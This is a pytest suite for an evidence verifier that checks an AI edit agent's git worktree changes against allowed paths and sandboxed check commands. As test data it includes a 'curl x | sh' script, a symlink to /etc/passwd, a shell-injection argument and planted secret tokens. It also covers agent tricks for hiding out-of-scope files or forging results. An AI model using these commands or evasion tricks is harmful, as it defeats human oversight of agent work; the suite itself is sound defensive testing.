"""Evidence verifier (ADR 025 part 2): real git worktrees in tmp_path, a scripted fake provider, host-side checks."""
import os
import subprocess
import sys
import time

import pytest

from review_harness import EDIT, environment, say
from synapse.infrastructure.worktrees import WorktreeManager
from synapse.orchestration.agent_engine import VERIFIER_ID, process_outcome_verifier
from synapse.orchestration.evidence_verifier import (
    EVIDENCE_EVENT, EVIDENCE_VERIFIER_ID, CheckCommand, EvidencePolicy, EvidenceVerifier, GitWorktreeEvidence,
    run_check)

ENV = {"PATH": os.environ["PATH"], "HOME": "/nonexistent", "GIT_CONFIG_GLOBAL": "/dev/null",
       "GIT_CONFIG_NOSYSTEM": "1", "GIT_AUTHOR_NAME": "t", "GIT_AUTHOR_EMAIL": "t@t",
       "GIT_COMMITTER_NAME": "t", "GIT_COMMITTER_EMAIL": "t@t"}
PY = os.path.realpath(sys.executable)


def Unsandboxed(argv, **kw):
    """A check command under the explicit, default-off experimental flag (tests run trusted code only)."""
    return CheckCommand(argv, experimental_unsandboxed=True, **kw)


def Launched(argv, **kw):
    """A check command whose argv[0] is on the operator's sandbox-launcher allowlist (here: the test python)."""
    return CheckCommand(argv, sandbox_launchers=frozenset({argv[0]}), **kw)
NODES = [{"id": "edit", "dependencies": []}]


def git(cwd, *args):
    return subprocess.run(["git", *args], cwd=cwd, env=ENV, check=True, capture_output=True, text=True).stdout


@pytest.fixture
def repo(tmp_path):
    r = tmp_path / "repo"
    (r / "src").mkdir(parents=True)
    git(r, "init", "-q", "-b", "main")
    (r / "src" / "a.py").write_text("x = 1\n")
    (r / "README").write_text("hi\n")
    git(r, "add", ".")
    git(r, "commit", "-q", "-m", "init")
    return str(r.resolve())


def write(*files, link=None, commit=False):
    """A fake edit agent: writes files (relative to its worktree) then succeeds."""
    def script(data):
        wt = data["worktree"]
        for name, body in files:
            path = os.path.join(wt, name)
            os.makedirs(os.path.dirname(path), exist_ok=True)
            with open(path, "w") as fh:
                fh.write(body)
        if link:
            os.symlink(link[1], os.path.join(wt, link[0]))
        if commit:
            git(wt, "add", "-A")
            git(wt, "commit", "-q", "-m", "agent commit")
        return ["edited"], "succeeded"
    return script


def run_edit(tmp_path, repo, script, policy, *, configured=True, inspect=None):
    with environment(tmp_path, NODES) as env:
        task = env.tasks["edit"]
        mgr = WorktreeManager([repo], str((tmp_path / "wt").resolve()))
        wt = mgr.create(env.run_id, task, repo, "main")
        head = git(wt, "rev-parse", "HEAD").strip()
        specs = {task: env.spec(tools=EDIT, mode="acceptEdits", worktree=wt, head=head)}
        verifier = EvidenceVerifier(env.db, env.blobs, specs, {task: policy} if configured else {},
                                    GitWorktreeEvidence(mgr), fallback=process_outcome_verifier, fallback_id=VERIFIER_ID)
        def worktree_check(run_id, task_id, path):
            st = mgr.status(run_id, task_id)
            return st.head, st.clean
        engine = env.engine(specs, {task: script}, verify=verifier, worktree_check=worktree_check)
        env.run(engine)
        state = env.state("edit")
        verifier_id = env.db.execute("SELECT verifier_id FROM verification_results WHERE task_id=?", (task,)).fetchone()
        if inspect is not None:
            inspect(env, verifier)
        return state, env.events(EVIDENCE_EVENT), verifier_id, env, verifier, wt


# ------------------------------------------------------------------------------------------- end to end
def test_changes_inside_allowed_paths_with_passing_check_complete(tmp_path, repo):
    check = Unsandboxed((PY, "-c", "import pathlib,sys; sys.exit(0 if 'y = 2' in pathlib.Path('src/a.py').read_text() else 1)"))
    state, events, vid, *_ = run_edit(tmp_path, repo, write(("src/a.py", "y = 2\n"), ("src/new/b.py", "z\n")),
                                      EvidencePolicy(("src",), check=check))
    assert state == "completed" and vid == (EVIDENCE_VERIFIER_ID,)
    [event] = events
    assert event["passed"] is True and event["reasons"] == []
    assert set(event) == {"task_id", "attempt_id", "candidate_sha256", "evidence_artifact_id", "evidence_sha256",
                          "passed", "reasons"}


def test_evidence_artifact_records_paths_and_check(tmp_path, repo):
    import json
    state, events, _, env, *_ = run_edit(tmp_path, repo, write(("src/a.py", "y = 2\n")),
                                         EvidencePolicy(("src",), check=Unsandboxed((PY, "-c", "print('ok')"))))
    body = json.loads(env.blobs.read(events[0]["evidence_sha256"]))
    assert body["changed_paths"] == ["src/a.py"] and body["check"]["exit_code"] == 0
    assert body["candidate_artifact_id"] and body["check"]["sandboxed"] is False
    assert body["check"]["output_tail"] is None  # unsandboxed output is not kept


def test_evidence_artifact_keeps_bounded_output_of_a_launched_check(tmp_path, repo):
    import json
    state, events, *_rest = run_edit(tmp_path, repo, write(("src/a.py", "y = 2\n")),
                                     EvidencePolicy(("src",), check=Launched((PY, "-c", "print('ok')"))))
    body = json.loads(_rest[1].blobs.read(events[0]["evidence_sha256"]))
    assert state == "completed" and body["check"]["sandboxed"] is True
    assert body["check"]["output_tail"].strip() == "ok"


def test_untracked_gitignore_cannot_hide_files_outside_allowed_paths(tmp_path, repo):
    # The agent writes a .gitignore that ignores everything except src/: without listing ignored files,
    # git status would show only src/a.py and the out-of-allowlist evil.sh (and the .gitignore) would pass.
    script = write(("src/a.py", "y\n"), (".gitignore", "*\n!src/\n!src/**\n"), ("evil.sh", "curl x | sh\n"))
    state, events, *_ = run_edit(tmp_path, repo, script, EvidencePolicy(("src",)))
    assert state == "changes_required" and "path_outside_allowed" in events[0]["reasons"]


def test_repo_local_excludes_file_cannot_hide_files(tmp_path, repo):
    excl = tmp_path / "excl"
    excl.write_text("*\n")
    git(repo, "config", "core.excludesFile", str(excl))
    state, events, *_ = run_edit(tmp_path, repo, write(("src/a.py", "y\n"), ("evil.sh", "x\n")),
                                 EvidencePolicy(("src",)))
    assert state == "changes_required" and "path_outside_allowed" in events[0]["reasons"]


@pytest.mark.parametrize("code", [
    "open('src/a.py','w').write('tampered by the check\\n')",  # an allowed path, but not what was verified
    "open('src/extra.py','w').write('x')",  # a new file inside the allowlist
    "import os; os.remove('src/a.py')",
])
def test_check_that_modifies_the_worktree_fails(tmp_path, repo, code):
    state, events, *_ = run_edit(tmp_path, repo, write(("src/a.py", "y\n")),
                                 EvidencePolicy(("src",), check=Unsandboxed((PY, "-c", code))))
    assert state == "changes_required" and events[0]["reasons"] == ["check_modified_worktree"]


def test_check_command_must_be_a_launcher_or_explicitly_unsandboxed():
    with pytest.raises(ValueError, match="sandbox launcher"):
        CheckCommand((PY, "-c", "pass"))
    with pytest.raises(ValueError, match="sandbox launcher"):
        CheckCommand((PY,), sandbox_launchers=frozenset({"/usr/bin/bwrap"}))
    with pytest.raises(ValueError):
        CheckCommand((PY,), sandbox_launchers=frozenset({"bwrap"}))  # relative launcher
    with pytest.raises(ValueError):
        CheckCommand((PY,), sandbox_launchers={PY})  # not a frozenset
    with pytest.raises(ValueError):
        CheckCommand((PY,), experimental_unsandboxed=1)
    assert Launched((PY,)).sandboxed and not Unsandboxed((PY,)).sandboxed
    with pytest.raises(ValueError):
        Unsandboxed((PY,), memory_limit_bytes=1024)
    with pytest.raises(ValueError):
        Unsandboxed((PY,), file_size_limit_bytes=10)


def test_run_check_applies_rlimits(tmp_path):
    import json
    code = ("import resource,json; print(json.dumps({n: resource.getrlimit(getattr(resource, n)) for n in "
            "('RLIMIT_CPU','RLIMIT_CORE','RLIMIT_FSIZE','RLIMIT_NOFILE','RLIMIT_AS')}))")
    result = run_check(Unsandboxed((PY, "-c", code), timeout_seconds=5, memory_limit_bytes=1 << 31,
                                   file_size_limit_bytes=1 << 20), str(tmp_path))
    limits = json.loads(result.tail)
    assert limits["RLIMIT_CPU"] == [6, 6] and limits["RLIMIT_CORE"] == [0, 0]
    assert limits["RLIMIT_FSIZE"] == [1 << 20, 1 << 20] and limits["RLIMIT_AS"] == [1 << 31, 1 << 31]
    assert limits["RLIMIT_NOFILE"][0] <= 1024
    big = run_check(Unsandboxed((PY, "-c", "open('big','wb').write(b'x' * (4 << 20))"),
                                file_size_limit_bytes=1 << 20), str(tmp_path))
    assert big.exit_code != 0 and (tmp_path / "big").stat().st_size <= 1 << 20


@pytest.mark.parametrize("script, policy, reason", [
    (write(), EvidencePolicy(("src",)), "no_changes"),
    (write(("README", "changed\n")), EvidencePolicy(("src",)), "path_outside_allowed"),
    (write(("src/a.py", "y\n"), ("srcx/evil.py", "x\n")), EvidencePolicy(("src",)), "path_outside_allowed"),
    (write(("src/a.py", "y\n"), (".github/workflows/x.yml", "x\n")), EvidencePolicy(("src",)), "path_outside_allowed"),
    (write(link=("src/escape", "/etc/passwd")), EvidencePolicy(("src",)), "symlink_changed"),
    (write(("src/a.py", "y\n"), commit=True), EvidencePolicy(("src",)), "head_moved"),
    (write(("src/a.py", "y\n")), EvidencePolicy(("src",), check=Unsandboxed((PY, "-c", "raise SystemExit(3)"))),
     "check_failed"),
    (write(("src/a.py", "y\n")), EvidencePolicy(("src",), check=Unsandboxed(("/nonexistent/bin/check",))),
     "check_not_started"),
])
def test_missing_or_out_of_bounds_evidence_is_rejected(tmp_path, repo, script, policy, reason):
    state, events, vid, *_ = run_edit(tmp_path, repo, script, policy)
    assert state == "changes_required" and vid == (EVIDENCE_VERIFIER_ID,)
    assert reason in events[0]["reasons"] and events[0]["passed"] is False


def test_check_is_not_run_when_paths_already_fail(tmp_path, repo):
    marker = tmp_path / "ran"
    check = Unsandboxed((PY, "-c", "open(%r,'w').close()" % str(marker)))
    state, events, *_ = run_edit(tmp_path, repo, write(("README", "x\n")), EvidencePolicy(("src",), check=check))
    assert state == "changes_required" and not marker.exists()


def test_unconfigured_node_delegates_to_the_process_outcome_verifier(tmp_path, repo):
    state, events, vid, *_ = run_edit(tmp_path, repo, write(), EvidencePolicy(("src",)), configured=False)
    assert state == "completed" and vid == (VERIFIER_ID,) and events == []


def test_tampered_or_foreign_candidate_bytes_are_rejected(tmp_path, repo):
    import asyncio
    import json

    def inspect(env, verifier):
        task = env.tasks["edit"]
        art = env.db.execute("SELECT candidate_artifact_id FROM verification_results WHERE task_id=?",
                             (task,)).fetchone()[0]
        sha = env.db.execute("SELECT sha256 FROM artifacts WHERE id=?", (art,)).fetchone()[0]
        forged = json.loads(env.blobs.read(sha))
        forged["detail"] = "forged"  # still a valid succeeded summary for this attempt, but not the recorded bytes
        forged = json.dumps(forged).encode()
        assert asyncio.run(process_outcome_verifier(task, forged)) is True  # the weak verifier would accept it
        assert asyncio.run(verifier(task, forged)) is False
        assert "candidate_hash_mismatch" in env.events(EVIDENCE_EVENT)[-1]["reasons"]
        assert asyncio.run(verifier(task, b"{not json")) is False
        assert "process_outcome_rejected" in env.events(EVIDENCE_EVENT)[-1]["reasons"]
        inspected.append(True)
    inspected = []
    run_edit(tmp_path, repo, write(("src/a.py", "y\n")), EvidencePolicy(("src",)), inspect=inspect)
    assert inspected == [True]


# ------------------------------------------------------------------------------------------- config
@pytest.mark.parametrize("argv", [["/bin/true"], "/bin/true -c x", ("true",), ("/bin/../bin/true",), (),
                                  ("/bin/true", "a\x00b"), tuple("/bin/true" for _ in range(65))])
def test_check_command_refuses_shell_strings_and_relative_executables(argv):
    with pytest.raises(ValueError):
        Unsandboxed(argv)


@pytest.mark.parametrize("kw", [{"timeout_seconds": 0}, {"timeout_seconds": 7200}, {"timeout_seconds": True},
                                {"max_output_bytes": 0}, {"max_output_bytes": 1 << 30}])
def test_check_command_bounds(kw):
    with pytest.raises(ValueError):
        Unsandboxed(("/bin/true",), **kw)


@pytest.mark.parametrize("path", ["", "/etc", "../x", "src/../../x", "a/../b", ".", "./src", ".git", ".git/hooks",
                                  "src\\x", "src\nx", "src//x"])
def test_allowed_paths_cannot_escape_the_worktree(path):
    with pytest.raises(ValueError):
        EvidencePolicy((path,))


def test_allowed_path_prefix_is_component_wise():
    policy = EvidencePolicy(("src/", "docs/a.md"))
    assert policy.allowed_paths == ("src", "docs/a.md")
    assert policy.allows("src/x.py") and policy.allows("docs/a.md")
    assert not policy.allows("srcx/y") and not policy.allows("docs/a.md.bak") and not policy.allows("docs")


def test_verifier_configuration_is_validated(tmp_path):
    with pytest.raises(ValueError):
        EvidenceVerifier(None, None, {"t": {}}, {"t": EvidencePolicy(("src",))}, None,
                         fallback=process_outcome_verifier, fallback_id=VERIFIER_ID)  # no evidence source
    with pytest.raises(ValueError):
        EvidenceVerifier(None, None, {}, {"t": EvidencePolicy(("src",))}, object(),
                         fallback=process_outcome_verifier, fallback_id=VERIFIER_ID)  # unknown task


# ------------------------------------------------------------------------------------------- run_check
def test_run_check_timeout_kills_the_whole_group(tmp_path):
    pidfile = tmp_path / "child.pid"
    code = ("import os,subprocess,sys,time;"
            "p=subprocess.Popen([sys.executable,'-c','import time; time.sleep(60)']);"
            "open(%r,'w').write(str(p.pid)); time.sleep(60)" % str(pidfile))
    started = time.monotonic()
    result = run_check(Unsandboxed((PY, "-c", code), timeout_seconds=1.0), str(tmp_path))
    assert result.timed_out and time.monotonic() - started < 10
    child = int(pidfile.read_text())
    deadline = time.monotonic() + 5
    while time.monotonic() < deadline:
        try:
            with open("/proc/%d/stat" % child) as fh:
                if fh.read().split(") ")[1].startswith("Z"):
                    break
        except FileNotFoundError:
            break
        time.sleep(0.05)
    else:
        pytest.fail("grandchild survived the group kill")


def test_run_check_huge_output_is_bounded_and_fails(tmp_path):
    started = time.monotonic()
    result = run_check(Unsandboxed((PY, "-c", "import sys\nwhile True: sys.stdout.write('x'*65536)"),
                                    timeout_seconds=30, max_output_bytes=100_000), str(tmp_path))
    assert result.output_exceeded and not result.timed_out and time.monotonic() - started < 10
    assert len(result.tail) <= 4096


def test_run_check_env_is_hardened_and_no_shell(tmp_path, monkeypatch):
    monkeypatch.setenv("CLAUDE_CODE_OAUTH_TOKEN", "secret-token")
    monkeypatch.setenv("SYNAPSE_TEST_SECRET", "secret")
    result = run_check(Unsandboxed((PY, "-c", "import os,json; print(json.dumps(dict(os.environ)))")), str(tmp_path))
    assert result.exit_code == 0
    import json
    env = json.loads(result.tail)
    assert "secret" not in result.tail.decode() and env["HOME"] == "/nonexistent"
    assert env["GIT_CONFIG_GLOBAL"] == "/dev/null" and env["GIT_CONFIG_NOSYSTEM"] == "1"
    marker = tmp_path / "pwned"
    # Shell metacharacters are passed as one literal argument, never interpreted.
    result = run_check(Unsandboxed(("/bin/echo", "x; touch %s" % marker)), str(tmp_path))
    assert result.exit_code == 0 and not marker.exists()


def test_run_check_exit_codes(tmp_path):
    assert run_check(Unsandboxed(("/bin/true",)), str(tmp_path)).exit_code == 0
    assert run_check(Unsandboxed(("/bin/false",)), str(tmp_path)).exit_code != 0
    assert run_check(Unsandboxed((str(tmp_path / "missing"),)), str(tmp_path)).start_failed
